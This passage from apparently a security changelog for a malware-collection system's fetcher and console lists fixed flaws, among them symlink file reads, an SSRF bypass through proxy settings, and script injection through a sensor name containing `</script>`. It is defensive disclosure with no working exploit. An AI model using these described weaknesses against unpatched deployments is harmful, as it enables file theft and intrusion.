  uploader opened a digest-named spool entry by name, so a symlink planted in a spool (which the
  internet-facing sensors write) made them read whatever local file it named, and the uploader
  could send it to a third party when unknown-sample upload was on. Entries are now opened without
  following links, must be regular files within the 500 MB sample cap, and are re-hashed against
  their names; a mismatch answers 409.
- **Nodes sharing a database share the fetcher's limits** - each node picked its own fetch rows and
  kept the per-host and daily budgets in memory, so two nodes could fetch the same malware URL at
  once, N nodes spent N times each cap, and a restart reset the daily count. Rows are now claimed
  with a lease (`claim_expires`) and the budgets are spent in the database under a row lock
  (migration `0006`, new table `fetch_daily_usage`).
- **Captured bodies record how their transport was authenticated** - the fetcher never validated
  certificates, so an https capture carried no evidence that its bytes came from the named host.
  It now validates first and fetches again without validation only after a certificate failure,
  to the same pinned address, and labels every captured body `verified`, `unverified` (with the
  validation error), `plaintext` or `unknown` (migration `0007`); the samples page shows the label.
  Cost: a TLS 1.2 server that can sign its handshake only with SHA-1 is no longer captured.
  Plain-http hops build no certificate verifier, so they neither load the system trust store
  nor fail on a host without one.
- **The fetcher ignores proxy settings in its environment** - reqwest reads `HTTP_PROXY`,
  `HTTPS_PROXY` and `ALL_PROXY` by default, and a proxy resolves and dials the host itself, so a
  fetch would have bypassed the address the SSRF guard vetted.
- **Every special-purpose address block is kept out of the feed** - the reserved list gains the
  IANA special-purpose blocks it lacked (carrier-grade NAT `100.64.0.0/10` among them), and an IPv6
  address that embeds an IPv4 host (mapped, NAT64 `64:ff9b::/96`, 6to4) is judged by that host.
  Such addresses are never published, reported or dialed. Existing rows are not rewritten: the next
  feed build drops them, an approved queue row for one is held as reserved and warns on every
  poll, and a fetch row resolving into one is rejected on its next attempt.
- **The console bounds what one client can hold** - `axum::serve` armed no header timeout and
  capped nothing, so slow or idle connections could be held indefinitely. The console now runs its
  own HTTP/1.1 accept loop (64 connections, 10 s for headers, 10 s and 2 MiB for a body), checks
  passwords in two bounded slots so a login flood cannot take the CPU, and limits login attempts
  to 30 a minute across all addresses as well as 5 per address. `propolis_console_*` metrics count
  what was refused.
- **A Content-Security-Policy on every page** - scripts and styles are served as files, templates
  carry no inline script, style or event handler, and every response carries a policy that allows
  script and style only from the console itself. The error pages the console builds without a
  template follow it too, and Relist, Delist and Delete, which used to confirm through an inline
  handler, render disabled until the script that asks for confirmation has loaded.
- **Chart data cannot end its script element** - the dashboard's protocol chart labels are
  sensor names, which intake takes as any non-empty string and a split deployment receives from
  its collectors. Placed raw in the chart's JSON data element, a name holding `</script>` ended
  the element and put the rest into the operator's page as markup (before the policy, as script).
  Chart data now escapes `<`, `>` and `&` as JSON unicode escapes.
- **Chain verification needs a CSRF token** - `POST /integrity/verify` reads the whole ledger but
  took no token; it now requires one like every other console POST, and a second run while one is
  in progress answers 409.
- **Certificates are written without following links** - `provision-certs` wrote each PEM and
  tightened key modes afterwards, following any link already at the target and joining the
  collector id into the path unchecked. Files are now created new with their final mode, and a
  collector id that is not a plain name is refused.
- **Dependency policy** - `event-listener` 5.4.2 (RUSTSEC-2026-0221), two yanked crates replaced,
  unused and unmaintained crates removed. `deny.toml` fails CI on a vulnerable, unsound,
  unmaintained or yanked crate, a licence outside the allowlist, or an unknown registry or git
  source, with one reviewed exception (RUSTSEC-2023-0071 in `rsa`, reachable only from a test
  client).
